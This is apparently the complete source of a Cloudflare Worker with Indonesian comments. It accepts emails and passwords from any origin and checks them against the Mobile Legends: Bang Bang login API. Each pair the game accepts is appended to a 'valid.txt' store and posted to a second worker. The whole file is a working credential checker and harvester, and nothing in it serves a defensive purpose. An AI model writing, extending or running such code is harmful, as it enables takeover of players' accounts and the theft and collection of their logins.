export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // CORS preflight
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
        },
      });
    }

    if (url.pathname === "/check" && request.method === "POST") {
      try {
        const { email, password, captcha_token } = await request.json();
        if (!email || !password || !captcha_token) {
          return Response.json({ error: "Missing parameters" }, { status: 400 });
        }

        // Format body jadi x-www-form-urlencoded
        const params = new URLSearchParams();
        params.append("email", email);
        params.append("password", password);
        params.append("captcha", captcha_token);

        // Kirim request ke API MLBB
        const mlbbRes = await fetch("https://accountmtapi.mobilelegends.com/", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; Mobile)",
            "Accept": "*/*",
            "Connection": "keep-alive",
          },
          body: params.toString(),
        });

        if (!mlbbRes.ok) {
          return Response.json(
            { error: `MLBB API error: ${mlbbRes.status}` },
            { status: mlbbRes.status }
          );
        }

        const data = await mlbbRes.json();

        // Jika akun valid
        if (data.code === 0) {
          const line = `${email}|${password}\n`;

          // Simpan ke KV sementara
          if (env.VALID_ACCOUNT) {
            let old = (await env.VALID_ACCOUNT.get("valid.txt")) || "";
            old += line;
            await env.VALID_ACCOUNT.put("valid.txt", old);
          }

          // Kirim ke Worker B
          if (env.WORKER_B_URL && env.SECRET_KEY) {
            try {
              await fetch(env.WORKER_B_URL + "/save", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  secret: env.SECRET_KEY,
                  account: `${email}|${password}`,
                }),
              });
            } catch (err) {
              console.error("Gagal kirim ke Worker B:", err);
            }
          }
        }

        return Response.json(data, {
          headers: { "Access-Control-Allow-Origin": "*" },
        });

      } catch (err) {
        return Response.json({ error: err.message }, { status: 500 });
      }
    }

    return new Response("Worker A aktif", {
      status: 200,
      headers: { "Access-Control-Allow-Origin": "*" },
    });
  },
};
